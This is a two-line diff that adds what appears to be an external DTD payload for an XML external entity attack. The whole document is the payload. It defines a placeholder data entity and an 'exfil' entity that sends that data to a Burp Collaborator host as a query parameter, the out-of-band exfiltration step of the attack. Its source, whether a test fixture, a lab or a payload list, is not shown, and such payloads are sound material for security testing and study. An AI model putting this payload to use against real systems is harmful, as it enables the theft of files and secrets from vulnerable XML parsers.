@@ -1,0 +1,2 @@
+<!ENTITY % data "blah">
+<!ENTITY % exfil SYSTEM "http://hsd7qdrue8sfant28ld89ebl5cb2zr.burpcollaborator.net/?xyz=%data;">
